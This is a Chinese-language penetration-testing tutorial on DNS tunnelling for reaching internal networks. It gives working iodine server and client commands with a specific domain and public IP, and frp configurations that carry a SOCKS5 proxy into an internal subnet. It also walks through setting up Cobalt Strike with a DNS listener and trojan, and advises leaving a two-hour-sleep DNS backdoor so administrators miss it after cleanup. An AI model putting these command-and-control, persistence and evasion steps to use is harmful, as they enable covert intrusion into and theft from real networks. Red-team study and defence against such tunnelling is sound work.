[TOC]



# ==DNS隧道==

### 内网渗透-DNS隧道

#### 一、DNS隧道概述

DNS隧道，是隧道技术中的一种。当我们的HTTP、HTTPS这样的上层协议、正反向端口转发都失败的时候，可以尝试使用DNS隧道。DNS隧道很难防范，因为平时的业务也好，使用也罢，难免会用到DNS协议进行解析，所以防火墙大多对DNS的流量是放行状态。这时候，如果我们在不出网机器构造一个恶意的域名（xxx.yyyy.zz）让他去访问，如果此时本地的DNS服务器无法给出回答时，就会以迭代查询的方式通过互联网定位到所查询域的权威DNS服务器。最后，如果让这条DNS请求落到我们提前搭建好的恶意DNS服务器上，那么我们的不出网主机就和恶意DNS服务器交流上了。

DNS隧道(DNS Tunneling)是将其他协议的内容封装在DNS协议中，然后以DNS请求和响应包完成传输数据(通信)的技术。当前网络世界中的DNS是一项必不可少的服务，所以防火墙和入侵检测设备处于可用性和用户友好的考虑将很难做到完全过滤掉DNS流量，因此，攻击者可以利用它实现诸如远程控制，文件传输等操作，众多研究表明DNS Tunneling在僵尸网络和APT攻击中扮演着至关重要的角色。

**DNS隧道**依据其实现方式大致可分为**直连**和中继两类。

**直连**：用户端直接和指定的目标DNS服务器建立连接，然后将需要传输的数据编码封装在DNS协议中进行通信。这种方式的优点是具有较高速度，但隐蔽性弱、易被探测追踪的缺点也很明显。另外直连方式的限制比较多，如目前很多的企业网络为了尽可能的降低遭受网络攻击的风险，一般将相关策略配置为仅允许与指定的可信任DNS服务器之间的流量通过。

**中继隧道**：通过DNS迭代查询而实现的中继DNS隧道，这种方式及其隐秘，且可在绝大部分场景下部署成功。但由于数据包到达目标DNS服务器前需要经过多个节点的跳转，数据传输速度和传输能力较直连会慢很多。

##### 实现DNS隧道的关键要点：

**dns2tcp**：支持直连模式的DNS隧道，只实现了简单的DNS隧道，相关命令和控制服务需要自行搭建，且已在kali系统中直接集成。
**iodine**：最活跃、速度最快、支持直连和中继模式，且支持丰富的编码、请求类型选择
**Dnscat2**：封装在DNS协议中的加密C&C信道，直接运行工具即可实现数据传输、文件操作等命令和控制功能。

iodine是基于C语言开发的，分为服务端和客户端。iodine支持转发模式和中继模式。其原理是：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道连接，处于同一个局域网(可以通过ping命令通信)。在客户端和服务器之间建立连接后，客户机上会多出一块名为dns0的虚拟网卡。

#### 二、前期准备：一个域名，一个公网服务器

##### 1、域名：matrika.cn， 公网服务器IP: 47.96.116.171，然后添加以下两条域名解析记录：

![image-20230309005246806](https://gitee.com/ymq_typroa/typroa/raw/main/20230309005246.png)

第一条A类记录，告诉域名系统，”www.matrika.cn”的IP地址是” 47.96.116.171”，确认可以Ping通。

第二条NS记录，告诉域名系统，”ns.matrika.cn”的域名由”www.matrika.cn”进行解析。为什么要设置NS类型的记录呢？因为NS类型的记录不是用于设置某个域名的DNS服务器的，而是用于设置某个子域名的DNS服务器的。

##### 2、在公网服务器中允许53号端口

![image-20230309010609498](https://gitee.com/ymq_typroa/typroa/raw/main/20230309010609.png)

##### 3、测试域名解析是否生效

在公网服务器运行tcpdump监听UDP 53号端口

```
tcpdump -n -i eth0 udp dst port 53
```

在任意主机上运行nslookup发起DNS解析请求

```
nslookup ns.matrika.cn
```

如果在公网服务器监听到请求数据，说明域名的NS记录设置成功：

![image-20241021220831202](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241021220831202.png)

#### 二、iodine DNS隧道搭建

##### 1、安装iodine

在我们的公网服务器安装iodine，该工具服务端为iodined，客户端为iodine，执行以下命令进行安装：

```
# yum install iodine
```

##### 2、在公网服务器运行服务端

![image-20241021221406304](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241021221406304.png)

执行完该命令之后会新生成一个dns0虚拟网卡，ip地址就是刚才命令中输入的ip地址(192.168.200.1)。

![image-20241021221904236](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241021221904236.png)

##### 3、在CentOS内网安装iodine

使用yum install iodine安装

使用源码安装：make && make install

4、在CentOS中连接ns.matrika.cn

![image-20241021222544123](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241021222544123.png)

#### 三、利用DNS隧道

##### 1、访问HTTP协议

在公网服务器上直接访问：curl http://192.168.200.2/dashboard/phpinfo.php

或在内网主机上访问公网：curl http://192.168.200.1/

##### 2、访问MySQL（TCP协议）

`mysql -uqiang -p123456 -h192.168.200.2`

##### 3、利用DNS隧道建立Socks5代理通道

（1）在公网服务器配置frps并启动

```
[common]
bind_addr = 0.0.0.0
bind_port = 7000
token = 12345678
```

（2）在内网主机上配置frpc并启动

```
[common]
server_addr = 192.168.200.1
server_port = 7000
token = 12345678

[socks5_xm]
type = tcp
remote_port = 8088
plugin = socks5

use_encryption = true
use_compression = true
```

（3）在Kali攻击主机上配置代理为：socks5 47.96.116.171 8088

（4）使用proxychains进行访问，或在浏览器中配置代理访问。则直接可以访问到内网的10.10.10.X网段。

整个过程，相当于是在DNS隧道中传输Socks5的通信数据，所以效率较低。但是却可以代理进内网，且始终基于DNS协议数据包。

#### 四、在CobaltStrike中使用DNS隧道

1、在公网服务器配置DNS解析（同上）

2、在公网服务器运行teamserver

同时确保公网服务器开放了UDP 53号端口和TCP 50050端口。

```
# ./teamserver 47.96.116.171 123456
```

3、在CobaltStrike中连接teamserver

![image-20230309203004320](https://gitee.com/ymq_typroa/typroa/raw/main/20230309203004.png)

4、创建DNS监听器

![image-20230309203142961](https://gitee.com/ymq_typroa/typroa/raw/main/20230309203143.png)

5、生成木马

![image-20230309203219995](https://gitee.com/ymq_typroa/typroa/raw/main/20230309203220.png)

6、在目标主机运行木马

上线后可以看到列表，但是通常显示为黑色，表示没有完全上线成功

![image-20230309203345397](https://gitee.com/ymq_typroa/typroa/raw/main/20230309203345.png)

此时，右键黑色列表，点击 Interact 进入命令行，运行 checkin 实现完整上线。后续操作与其他木马的操作一致，只是DNS一次传输的数据量不大，所以相对较慢，建议将 sleep 时间设置得大一点，如10秒。

但是在实战环节中，由于其速度较慢，所以通常会通过DNS隧道来新建一个HTTP的木马（右键菜单Spawn即可新建），进而将DNS隧道的Sleep时间设置为很长很长（比如2个小时），有效防止被检测到。这样如果HTTP木马没有被关闭，则直接使用HTTP木马，而如果被关闭了，DNS隧道还能够继续使用，同时，这也是另外一种防止被入侵排查把连接干掉的方式，因为管理员通常发现了一个后门后，不太会想到还有一个DNS，通信频率为2个小时的后门存在。

![image-20230814184948721](https://gitee.com/ymq_typroa/typroa/raw/main/202308141849112.png)

#### 五、与Windows建立DNS隧道

下载Tap驱动：

http://swupdate.openvpn.org/community/releases/tap-windows-9.21.2.exe，这是由OpenVPN开发的Windows下的虚拟网卡驱动，如果不安装，在Windows上使用iodine时会出现以下错误：

```
C:\Tools\SecurityTools\iodine-0.7.0-windows\64bit>iodine -f -P woniu123 47.96.116.171 ns.matrika.cn
Error opening registry key €骳
No TAP adapters found. Version 0801 and 0901 are supported.
```

下载iodine：

https://code.kryo.se/iodine/，然后正常执行以下命令（管理员权限执行）

```
c:\ME\iodine-0.7.0-windows\64bit>iodine -f -P woniu123 47.96.116.171 ns.matrika.cn
```

![image-20241021223544758](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241021223544758.png)

DNS_Shell反弹工具:

https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247485998&idx=1&sn=1c33964da6a4e58652d4f0a2231fd103&chksm=eaad8a13ddda0305bf63f0ef024c69ef0b9ed4fa8741f3b25d7da03964b666b2fcdaf4750fc7&scene=21#wechat_redirect